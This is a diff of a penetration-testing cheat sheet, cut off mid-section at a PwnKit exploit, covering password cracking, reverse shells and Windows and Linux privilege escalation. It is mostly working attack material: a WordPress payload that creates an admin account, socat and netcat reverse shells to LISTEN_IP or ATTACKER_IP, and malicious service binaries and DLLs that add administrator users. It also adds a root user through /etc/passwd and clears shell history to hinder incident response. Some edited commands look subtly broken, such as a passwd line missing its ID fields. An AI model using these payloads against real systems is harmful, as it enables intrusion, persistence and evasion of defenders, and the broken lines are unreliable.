@@ -1208,7 +1208,7 @@ var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
 
 // Create new admin account
-var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=derp&email=derp@derp.com&pass1=herpaderp&pass2=herpaderp&role=administrator";
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=derp&email=derp@derp.com&pass1=herpderp&pass2=herpderp&role=administrator";
 ajaxRequest = new XMLHttpRequest();
 ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -2121,7 +2121,7 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://
 **Add RDP User**: (good for persistence)
 
 ```powershell
-net user derp herpaderp /add
+net user derp herpderp /add
 net localgroup Administrators derp /add
 net localgroup "Remote Desktop Users" derp /add
 # enable remote desktop
@@ -2149,21 +2149,27 @@ psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connect
 
 **Interacting/Useful commands:**
 
+**NOTE**: `psql` supports tab completion for table names, db names.
+
 ```postgresql
 -- List databases
 SELECT datname FROM pg_database;
+\l
 \list
 
 -- List schemas
 SELECT schema_name,schema_owner FROM information_schema.schemata;
 \dn+
 
-\c <database> -- use the database
+\c <database> -- use (connect to) the database
 \d -- List tables
-\du+ -- Get users roles
+\d+ <tablename> -- describe table
+-- SQL standard way to describe table:
+select column_name, data_type from information_schema.columns where table_name = <tablename>
 
 -- Get current user
 Select user;
+\du+ -- Get users roles
 
 --Read credentials (usernames + pwd hash)
 SELECT usename, passwd from pg_shadow;
@@ -2276,7 +2282,7 @@ db.getCollectionNames();
 # create new collection (table) called "users"
 db.createCollection("users")
 # create new document (row) in users collection:
-db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpaderp"})
+db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpderp"})
 # show all documents (rows) in the users collection:
 db.users.find()
 # get all documents matching search criteria
@@ -2420,6 +2426,13 @@ searchsploit -m /path/to/exploit # mirror exploit file to current directory
 
 ## 4.2 Cracking Password Hashes
 
+Here are my favorite wordlists to try:
+
+```
+/usr/share/wordlists/fasttrack.txt
+/usr/share/wordlists/rockyou.txt
+```
+
 ### 4.2.1 Identifying Unknown Hash Format
 
 ```sh
@@ -2535,7 +2548,7 @@ hashcat --restore
 
 # showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes
 # hashcat has a potfile (hashcat.potfile) to store old passwords
-hashcat -m1800 --show --username --outfile-format=2 shadow
+hashcat --show --user --outfile-format=2 shadow
 
 # crack all LANMAN hashes with hashcat
 # '-1' flag creates a custom alphabet to use in mask as '?1', can do -2, -3
@@ -2543,9 +2556,9 @@ hashcat -m1800 --show --username --outfile-format=2 shadow
 # '--potfile-path' specfies custom potfile
 hashcat -a 3 -m 3000 -1 "?u?d?s" --increment --potfile-path hashcat.potfile customer.ntds "?1?1?1?1?1?1?1"
 
-# create bruteforce wordlist for all passwords starting with "summer" and ending in 2-4 digits
+# create wordlist for all passwords starting with "Summer" and ending in 2-4 digits
 # '--increment-min' specifies min length to start mask bruteforce
-hashcat --stdout -a 3 --increment --increment-min 2 "summer?d?d?d?d" > wordlist
+hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist
 ```
 
 **NOTE**: hashcat doesn't feed usernames into the wordlists automatically like john
@@ -2569,7 +2582,76 @@ rules.
 - `6` - Hybrid Wordlist + Mask: append mask to each word in wordlist
 - `7` - Hybrid Mask + Wordlist: prepend mask to each word in wordlist
 
-### 4.2.4 Password Cracking Examples
+### 4.2.4 Making Custom Wordlists
+
+**`cewl`** for scraping words from websites:
+```sh
+# cewl spiders a site starting at URL to scrape words
+# -e : include emails
+# --email_file FILE : save emails in separate file
+# -w FILE : write words to file
+# --lowercase : convert all words to lowercase
+# --with-numbers : include words with numbers
+# -d NUM : max depth to spider
+# -m NUM : minimum word length
+cewl -e --email_file emails.txt -w cewl.txt --lowercase --with-numbers -d 3 -m 5 URL
+```
+
+**`crunch`**:
+```sh
+# predefined charsets found in:
+cat /usr/share/crunch/charset.lst
+
+# Syntax:
+# crunch <min-len> <max-len> [ charset1 [ charset2 [ charset3 [ charset4 ]]]] [options]
+
+# Cmdline Flags:
+# -t PATT : use pattern, replacing placeholders ( @ , % ^ ) (see next)
+# -l PATT : literal mask - which placeholder chars in '-t' should be literal.
+#           Must match length of PATT used in '-t'.
+#           E.g. -t p@ssword%! -l p@sswordx! : makes @ a literal, % still placeholder
+# -o FILE : write output to file
+# -f : Specifies a character set from the charset.lst file
+# -s WORD : start at word
+# -e WORD : end at word
+# -p CHARSET / WORD WORD... : permute from charset/words (no repeats), MUST BE LAST OPTION
+# -q FILE : like '-p', but takes chars/words from file
+
+# Charset Placeholders for '-t':
+#   @ : 1st, or lowercase
+#   , : 2nd, or uppercase
+#   % : 3rd, or digits
+#   ^ : 4th, or symbols
+
+# Tip: if you don't want to count the characters in '-t' pattern, 
+# just put 1 for min and max lenght. It will tell you how long 
+# your pattern is when it errors out
+
+
+##  Examples  =====================================================
+
+# all possible 4 to 6 digit numeric PIN codes
+crunch 4 6 0123456789
+
+# matching template "Secret###!"
+crunch 10 10 -t 'Secret%%%!' -o wordlist.txt
+
+# every number between 1950 and 2050 (useful for years)
+crunch 4 4 -t %%%% -s 1950 -e 2050
+
+# seasonal passwords (e.g. Summer2020!)
+crunch 6 6 '@!#$' -t s%%%%@ -p Spring Summer Autumn Fall Winter
+```
+
+**`hashcat`**:
+```sh
+# create wordlist for all passwords starting with "Summer" and ending in 2-4 digits
+# '--increment-min' specifies min length to start mask bruteforce
+hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist
+```
+
+
+### 4.2.5 Password Cracking Examples
 
 KeePass databases (`*.kdbx`):
 
@@ -2583,7 +2665,6 @@ vim keepass.hash
 # crack with rockyou + rules
 hashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt
 ```
-
 
 
 ZIP files:
@@ -2767,14 +2848,14 @@ Great to support full tty and/or encryption. See Socat Reverse Shell (next).
 
 ```sh
 # full tty over TCP
-# "-d -d" prints fatal, error, warning, and notice messages
-socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT
+# "-dd" prints fatal, error, warning, and notice messages
+socat -dd file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT
 
 # no tty, plaintext over TCP
-socat -d -d TCP-LISTEN:LISTEN_PORT STDOUT
+socat -dd TCP-LISTEN:LISTEN_PORT STDOUT
 
 # full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
-socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
+socat -dd file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
 ```
 
 Note: to generate `mycert.pem` see [these instructions](#1051-create-self-signed-ssltls-certificate)
@@ -2786,13 +2867,13 @@ Use with Socat Listener (previous)
 
 ```sh
 # with full tty
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443
+socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443
 
 # no tty, text only
-socat EXEC:/bin/bash TCP:LISTEN_IP:443
+socat -dd EXEC:/bin/bash TCP:LISTEN_IP:443
 
 # full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0
+socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0
 ```
 
 For Windows victim, replace `/bin/bash` with `cmd.exe` or `powershell.exe`
@@ -2856,15 +2937,31 @@ For some Windows shellcode (mainly buffer overflow exploits), you might need to 
 
 
 
-### 4.4.1 Covering your tracks
+### 4.4.1 Running a detached/daemonized process on Linux
+
+When delivering a payload, sometimes it needs to run as a daemon so it doesn't
+die when the session/connection is closed. Normally you do this with `nohup`,
+`detach`, `screen`, or `tmux`, but sometimes none of those binaries are available.
+Still, you can accomplish creating a daemonized process by using sub-shells:
+
+```sh
+( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
+```
+
+
+
+### 4.4.2 Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
 terminal history. To avoid logging this (to make incident response team's job
 harder), use the following as your first command:
 
 ```sh
-# for zsh, bash, sh, etc.
-unset HISTFILE HISTSIZE HISTFILESIZE
+# for bash, sh
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+# for zsh, must tell it not to store anything in history
+# source: https://stackoverflow.com/a/68679235/5202294
+function zshaddhistory() {  return 1 }
 ```
 
 ```powershell
@@ -2876,15 +2973,33 @@ Remove-Module PSReadline
 
 
 
-### 4.4.2 Running a detached/daemonized process on Linux
+### 4.4.3 Upgrading to Interactive Shell
 
-When delivering a payload, sometimes it needs to run as a daemon so it doesn't
-die when the session/connection is closed. Normally you do this with `nohup`,
-`detach`, `screen`, or `tmux`, but sometimes none of those binaries are available.
-Still, you can accomplish creating a daemonized process by using sub-shells:
+Use this if you have a netcat-based reverse shell coming from a Linux box.
 
 ```sh
-( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
+###  In reverse shell  ##########
+python3 'import pty; pty.spawn("/bin/bash")'
+# windows
+c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'
+
+# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell
+
+###  In local shell  ##########
+# Get TTY rows/cols for later:
+stty size # prints "rows cols"
+# ignore hotkeys in the local shell and get back to remote shell
+stty raw -echo; fg # hit enter TWICE after this
+
+###  In reverse shell  ##########
+# set correct size for remote shell (ROWS and COLS from stty size)
+stty rows ROWS cols COLS
+# enable terminal colors
+export TERM=xterm-256color
+# reload bash to apply TERM env var
+exec /bin/bash
+
+export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 ```
 
 
@@ -3244,7 +3359,7 @@ void ControlHandler(DWORD request);
 //add the payload here
 int Run()
 {
-    system ("net user derp herpaderp /add");
+    system ("net user derp herpderp /add");
     system ("net localgroup administrators derp /add");
     return 0;
 }
@@ -3392,10 +3507,10 @@ Look for ones that allow writing (F, M, W), especially under `Authenticated User
 If the service binary is invoked without arguments, you can easily use `PowerUp.ps1` to exploit it:
 
 ```powershell
-# create new local admin user derp:herpaderp
+# create new local admin user derp:herpderp
 powershell -ep bypass
 . .\PowerUp.ps1
-Install-ServiceBinary -User 'derp' -Password 'herpaderp' -ServiceName 'SERVICENAME'
+Install-ServiceBinary -User 'derp' -Password 'herpderp' -ServiceName 'SERVICENAME'
 # by default, creates new local user: john with password Password123!
 ```
 
@@ -3411,7 +3526,7 @@ Create a malicious service binary. Here is a simple one that adds a new admin us
 
 int main ()
 {
-  system ("net user derp herpaderp /add");
+  system ("net user derp herpderp /add");
   system ("net localgroup administrators derp /add");
   return 0;
 }
@@ -3421,7 +3536,7 @@ Alternatively, create the windows service binary with `msfvenom`.
 
 ```sh
 # add user - msfvenom
-msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpaderp1!
+msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!
 
 # run arbitrary command - msfvenom
 msfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd="C:\Windows\Temp\nc.exe -L -p 6969 -e cmd.exe" lhost=ATTACKER_IP
@@ -3540,7 +3655,7 @@ LPVOID lpReserved ) // Reserved
   switch ( ul_reason_for_call )
   {
     case DLL_PROCESS_ATTACH: // A process is loading the DLL.
-      system ("net user derp herpaderp /add");
+      system ("net user derp herpderp /add");
       system ("net localgroup administrators derp /add");
       break;
     case DLL_THREAD_ATTACH: // A process is creating a new thread.
@@ -3558,7 +3673,7 @@ Alternatively, you can use `msfvenom` to create a malicious DLL:
 
 ```sh
 # add user - msfvenom
-msfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpaderp1!
+msfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpderp1!
 ```
 
 > :warning:  **NOTE:** Make sure you match the DLL to the ***appropriate architecture*** of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!
@@ -3613,7 +3728,7 @@ Once you find your candidate, generate a payload binary with `msfvenom` or whate
 
 ```sh
 # add user - msfvenom
-msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpaderp1!
+msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!
 
 # host on http
 sudo python -m http.server 80
@@ -3635,7 +3750,7 @@ If you are using PowerUp, you can use that to exploit the vulnerability:
 powershell -e bypass
 . .\PowerUp.ps1
 # change path as appropriate
-Write-ServiceBinary -Name 'SERVICENAME' -UserName 'derp' -Password 'herpaderp' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+Write-ServiceBinary -Name 'SERVICENAME' -UserName 'derp' -Password 'herpderp' -Path "C:\Program Files\Enterprise Apps\Current.exe"
 
 # still restart service
 restart-service "SERVICENAME"
@@ -3702,7 +3817,7 @@ wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotat
 unzip RoguePotato.zip
 
 # set up socat redirector for roguepotato to bounce off of
-sudo socat -d -d -d tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+sudo socat -ddd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
 # also start another netcat listener to catch the system shell
 sudo nc -vlnp 443
 ```
@@ -4567,7 +4682,7 @@ wmic process where name="nc.exe" delete
 ### 5.7.3 Add RDP User
 
 ```powershell
-net user derp herpaderp /add
+net user derp herpderp /add
 net localgroup Administrators derp /add
 net localgroup "Remote Desktop Users" derp /ADD
 # enable remote desktop
@@ -4619,96 +4734,64 @@ powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt
 
 # 6 Linux
 
-## 6.1 Upgrading to Interactive Shell
+## 6.1 Basic Linux Post-Exploit Enumeration
 
-Use this if you have a netcat-based reverse shell (on Linux box).
-
-```sh
-###  In reverse shell  ##########
-python3 'import pty; pty.spawn("/bin/bash")'
-# windows
-c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'
-
-# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell
-
-###  In local shell  ##########
-# Get TTY rows/cols for later:
-stty size # prints "rows cols"
-# ignore hotkeys in the local shell and get back to remote shell
-stty raw -echo; fg # hit enter TWICE after this
-
-###  In reverse shell  ##########
-# set correct size for remote shell (ROWS and COLS from stty size)
-stty rows ROWS cols COLS
-# enable terminal colors
-export TERM=xterm-256color
-# reload bash to apply TERM env var
-exec /bin/bash
-```
-
-## 6.2 Basic Linux Post-Exploit Enumeration
+Before you run basic enumeration, [upgrade to an interactive shell](#4.4.3%20Upgrading%20to%20Interactive%20Shell)
 
 ```sh
 # minimum commands
-unset HISTFILE
+id
 uname -a
 cat /etc/*release
-set                # or 'env'
+env                # or 'set'
 ps -ef wwf
-ifconfig -a        # or ip a
+ip a               # or ifconfig -a
 netstat -untap
 w
 last
 
 
-# unset history (shell command logging)
-unset HISTFILE
-export HISTFILE=
-unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
-export HISTCONTROL=ignorespace
-history -c
-
-# make sure terminal environment is good, if not working right
-export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
-export TERM=xterm-256color
+###############################
+## SELF  ######################
+###############################
 
 # current user
 id
 whoami
 
-# system hostname
-hostname -f
+# check sudo permissions
+sudo -l
+# take advantage of every permission you have!
+
+# environment
+(env || set) 2>/dev/null
+
+
+###############################
+## HOST  ######################
+###############################
+
+# hostname
+hostname
+hostname -A  # Linux - also shows all FQDNs
+hostname -f  # BSD,Mac - show FQDN
 cat /etc/hostname
 
 # OS Version info
-uname -a
+(cat /proc/version || uname -a ) 2>/dev/null
 cat /etc/*release
-cat /etc/*lease*
 cat /etc/issue
+# look for kernel version exploits
 
-# check sudo permissions
-sudo -l
 
-# check for CVE-2021-3156 (sudoedit heap-based buffer overflow, privesc)
-# *check only works if you are in sudoers file. Affects all legacy versions
-# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
-# Exploit works even if user isn't in sudoers file.
-sudoedit -s /
-# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
-# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git
-
-# running processes
-ps -ef wwf
-
-# Credentials
-ls -l /home/*/.ssh/id*  # ssh keys
-ls -AlR /home/*/.gnupg  # PGP keys
-ls -l /tmp/krb5*  # Kerberos tickets
+###############################
+## USERS  #####################
+###############################
 
 # list all users, groups
-grep -vE "nologin|false" /etc/passwd
 cat /etc/passwd
 cat /etc/group
+grep -vE "nologin|false" /etc/passwd
 cat /etc/master.passwd
 cat /etc/shadow  # need to be root, get list of hashed passwords
 # pretty print relevant data
@@ -4721,38 +4804,6 @@ who -a
 # Recently signed in users
 last  # better info running as root, may need "-a" switch
 
-# mounted filesystems
-mount
-cat /etc/fstab
-cat /etc/auto?master
-
-# check this user's cron jobs
-crontab -l
-# look at system-wide crontab
-cat /etc/crontab
-# pay attention to PATH in /etc/crontab and any bad file perms of scripts
-
-# check for running cron jobs
-grep "CRON" /var/log/cron.log
-
-# list every user's cron jobs
-for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null
-
-# find world-writable files
-# -mount doesn't descend into mounted file systems like /proc
-# -xdev is alternative equivalent to -mount on various systems
-find / -mount -type f -perm -o+w 2>/dev/null
-
-# find all SUID and SGID binaries
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
-
-# shell history
-cat /home/*/.*history
-grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null
-
-# Interesting files
-find / -type f -name *.gpg
-find / -type f -name id_rsa*
 
 ###############################
 ## NETWORK  ###################
@@ -4762,42 +4813,134 @@ find / -type f -name id_rsa*
 ip a
 ifconfig -a
 cat /etc/network/interfaces
+# check that you're on the box you expect
+# look for pivots into other networks
+# look for signs of virtualization, containers, antivirus
 
 # Routing info
 ip r
 route -n
+routel
 netstat -r
 
 # arp table
+ip n
 arp -a
 
-# DNS resolver info
-cat /etc/resolv.conf
+# Network connections
+# when commands run as root, get process info for all users
+# when run as user, only see owned process information
+ss -untap # Linux, all tcp/udp ports w/ pids
+netstat -untap  # Old linux, all tcp/udp ports w/ pids
+netstat -nvf inet # Mac
+lsof -Pni  # established connections
+fuser -n tcp PORTNUM # who is using port?
+# advanced, as root: data under /proc/net/
 
-# resolved hosts
+# known hosts
 cat /etc/hosts
 
-# Network connections
-netstat -tulnp  # all listening ports
-netstat -anop  # all connection types, with timers
-lsof -Pni  # established connections
-cat /proc/net/*  # lots of output??
-
-# iptables rules (must be root)
+# iptables rules
+cat /etc/iptables/rules.v4 # Debian,Ubuntu
+cat /etc/sysconfig/iptables # RHEL,CentOS,Fedora
+cat /etc/iptables/rules.v6 # Debian,Ubuntu
+cat /etc/sysconfig/ip6tables # RHEL,CentOS,Fedora
+# must be root to run 'iptables'
 iptables -L -v -n
 iptables -t nat -L -v -n  # NAT info
 iptables-save  # saved iptables
 
+# DNS resolver info
+cat /etc/resolv.conf
 
-##################################
-## Software  #####################
-##################################
+# if you have sudo permissions for tcpdump,
+# privesc with it (it's a GTFOBin).
+# Also, sniff for plaintext creds:
+sudo tcpdump -i lo -A | grep -i "pass"
+
+
+###############################
+## PROCESSES  #################
+###############################
+
+# running processes
+ps -ef wwf
+# look for unusual processes
+# or processes running as root that shouldn't be
+
+# view all cron scripts
+ls -lah /etc/cron*
+# look at system-wide crontab
+cat /etc/crontab
+# pay attention to PATH in /etc/crontab and any bad file perms of scripts
+
+# check this user's cron jobs
+crontab -l
+
+# check for running cron jobs
+grep "CRON" /var/log/syslog
+grep "CRON" /var/log/cron.log
+
+# list every user's cron jobs
+for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null
+
+
+###############################
+## FILESYSTEM  ################
+###############################
+
+# mounted filesystems
+mount
+cat /etc/fstab
+cat /etc/auto?master
+df -h # disk stats
+lsblk # available disks
+# unmounted partitions may have juicy files on them
+# look for credentials in /etc/fstab or /etc/auto*
+
+# find all SUID and SGID binaries
+find / -type f \( -perm -u+s -o -perm -g+s \) -executable -ls 2> /dev/null
+find / -type f \( -perm -u+s -o -perm -g+s \) -perm -o+x -ls 2> /dev/null
+
+# list writable directories in PATH
+( set -o noglob; IFS=:;[ -n "${ZSH_VERSION+1}" ] && MYPATH=($(echo "$PATH"))||MYPATH="$PATH"; for p in $MYPATH; do [ -w "$p" ] && ls -ald $p; done )
+
+# find world-writable files and directories
+find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type d -ls 2>/dev/null
+find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type f -ls 2>/dev/null
+# to limit search to current file system mount, use -mount or -xdev
+
+# find directories/files _this user_ can write to, not owned by me
+find / \( -path /sys -o -path /proc \) -prune -o -writable -type d -not -user "$(whoami)" -ls 2>/dev/null
+find / \( -path /sys -o -path /proc \) -prune -o -perm -o+w -type d -not -user "$(whoami)" -ls 2>/dev/null
+find / \( -path /sys -o -path /proc \) -prune -o -writable -type f -not -user "$(whoami)" -ls 2>/dev/null
+
+# check Capabilities of files
+# look for GTFOBins that have cap_setuid+ep (effective, permitted)
+/usr/sbin/getcap -r / 2>/dev/null | grep cap_setuid
+
+# shell history
+cat /home/*/.*history
+grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null
+
+# credential files
+ls -l /home/*/.ssh/id*  # ssh keys
+ls -AlR /home/*/.gnupg  # PGP keys
+ls -l /tmp/krb5*  # Kerberos tickets
+find / -type f -name *.gpg
+find / -type f -name id_rsa*
+
+
+
+###############################
+## SOFTWARE  ##################
+###############################
 
 # Info on installed packages
+dpkg -l  # Debian
 rpm -qa --last  # RedHat
 yum list | grep installed  # CentOS/RedHat w/ Yum
 apt list --installed  # Debain w/ Apt
-dpkg -l  # Debian
 pkg_info  # xBSD
 pkginfo  # Solaris
 ls -d /var/db/pkg/  # Gentoo
@@ -4805,6 +4948,10 @@ pacman -Q  # Arch
 cat /etc/apt/sources.list  # Apt sources
 ls -l /etc/yum.repos.d/  # Yum repos
 cat /etc/yum.conf  # Yum config
+
+# Kernel modules
+lsmod # list loaded modules
+/sbin/modinfo MODULENAME # get info on module
 
 # check version info of useful binaries
 gcc -v  # compiler
@@ -4821,8 +4968,27 @@ mysql --version
 which awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip
 
 
+##################################
+## VULNERABILITIES  ##############
+##################################
+
+# check for CVE-2021-3156 (sudoedit heap-based buffer overflow, privesc)
+# *check only works if you are in sudoers file. Affects all legacy versions
+# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
+# Exploit works even if user isn't in sudoers file.
+sudoedit -s /
+# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
+# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git
+
+# check sudo version
+sudo -V
+# if older than 1.8.28, root privesc:
+sudo -u#-1 /bin/bash
+# or sudo -u \#$((0xffffffff)) /bin/bash
+
+
 ####################################
-## Miscellaneous  ##################
+## MISCELLANEOUS  ##################
 ####################################
 
 # kernel system messages since boot
@@ -4839,7 +5005,7 @@ cat /etc/motd
 getenforce
 ```
 
-### 6.2.1 Watching for Linux Process Changes
+### 6.1.1 Watching for Linux Process Changes
 
 ```sh
 #!/bin/bash
@@ -4858,16 +5024,22 @@ while true; do
 done
 ```
 
-
-## 6.3 Linux Privilege Escalation
-
-So many options at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+Also check out [pspy](https://github.com/DominicBreuker/pspy)
 
 
-### 6.3.1 Escalating via sudo binaries
+## 6.2 Linux Privilege Escalation
 
-Many binaries let you run commands from within them. If you get limited `sudo`
+So many options:
+- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+- [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+
+
+### 6.2.1 Abusing `sudo`
+
+[Many binaries](https://gtfobins.github.io/#+sudo) let you run commands from within them. If you get limited `sudo`
 permissions for one of the binaries, you can escalate to root.
+
+> ⚠ **NOTE**: If you get "Permission denied" error, check `/var/log/syslog` to see if the `audit` daemon is blocking you with `AppArmor` (enabled by default on Debian 10).
 
 ```sh
 # check for sudo permissions
@@ -4883,7 +5055,35 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find . -exec /bin/sh \; -quit
 ```
 
-### 6.3.2 LD_PRELOAD and LD_LIBRARY_PATH
+### 6.2.2 Adding root user to /etc/shadow or /etc/passwd
+
+```sh
+# if /etc/shadow is writable
+# generate new password
+openssl passwd -6 herpderp
+# or
+mkpasswd -m sha-512 herpderp
+# edit /etc/shadow and overwrite hash of root with this one
+
+# if /etc/passwd is writable
+echo "derp:$(openssl passwd -6 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
+# alternatively
+echo "derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
+# pre-computed for password 'herpderp':
+echo 'derp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:root:/root:/bin/bash' >> /etc/passwd
+
+# can also add generated password between the first and second colon of root user
+```
+
+### 6.2.3 Grant passwordless sudo access
+
+Edit the `/etc/sudoers` file to have the following line:
+
+```
+myuser ALL=(ALL) NOPASSWD: ALL
+```
+
+### 6.2.4 LD_PRELOAD and LD_LIBRARY_PATH
 
 For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
 are inherited from the user's environment:
@@ -4945,7 +5145,7 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 # being called (must exactly match function signature)
 ```
 
-### 6.3.3 Hijacking SUID binaries
+### 6.2.5 Hijacking SUID binaries
 
 `inject.c`:
 ```c
@@ -5026,7 +5226,7 @@ which is used to display debug information (debug mode when `SHELLOPTS=xtrace`).
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
 
-### 6.3.4 Using NFS for Privilege Escalation
+### 6.2.6 Using NFS for Privilege Escalation
 
 NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
 something owned by root remotely is owned by root locally.
@@ -5047,7 +5247,7 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-### 6.3.5 Using Docker for Privesc
+### 6.2.7 Using Docker for Privesc
 
 This is possible when the user is a member of the `docker` group.
 
@@ -5060,12 +5260,13 @@ docker run --rm -it -v /:/mnt --privileged ubuntu bash
 From there, add your ssh key to `/mnt/root/.ssh/authorized_keys` or update the
 `/mnt/etc/passwd` file to include an additional malicious root user.
 
-### 6.3.6 Linux Kernel Exploits
+### 6.2.8 Linux Kernel Exploits
 
-#### 6.3.6.1 Dirty Cow Linux Privesc
+⚠ **NOTE**: Use LinPEAS to enumerate for kernel vulnerabilities. Searchsploit is often less effective.
 
-[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195)
-is effective against Linux kernels 2.x through 4.x before 4.8.3.
+#### 6.2.8.1 Dirty Cow
+
+[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195) is effective against Linux kernels 2.x through 4.x before 4.8.3.
 
 ```sh
 # easiest if g++ avail
@@ -5075,39 +5276,104 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 
 # Also good:
 searchsploit -m 40839
+
+# make dirtycow stable
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 ```
 
-## 6.4 Linux Persistence
 
-### 6.4.1 Adding root user to /etc/shadow or /etc/passwd
+#### 6.2.8.2 PwnKit
+
+[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) PwnKit is effective against many Linux variants:
+- Ubuntu 10 - Ubuntu 21.10
+- Debian 7 - Debian 11
+- RedHat 6.0 - RedHat 8.4 (and similar Fedora & CentOS versions?)
+
+Affects pkexec (polkit) < 0.120.
 
 ```sh
-# if /etc/shadow is writable
-# generate new password
-mkpasswd -m sha-512 password
-# or
-openssl passwd -1 -salt derp password
-# edit /etc/shadow and overwrite hash of root with this one
-
-# if /etc/passwd is writable
-echo "derp:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
-# alternatively
-echo "derp:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
-# pre-computed for password 'herpaderp':
-echo 'derp:$5$derp$uEWQFRg/9idrisiL6SgLNfSAv3.UNCc7eHUv.L1Wlo.:0:0:root:/root:/bin/bash' >> /etc/passwd
-
-# can also add generated password between the first and second colon of root user
+# check for vuln, must be < 0.120
+/usr/bin/pkexec --version
 ```
 
-### 6.4.2 Grant passwordless sudo access
+Exploit:
 
-Edit the `/etc/sudoers` file to have the following line:
-
+```sh
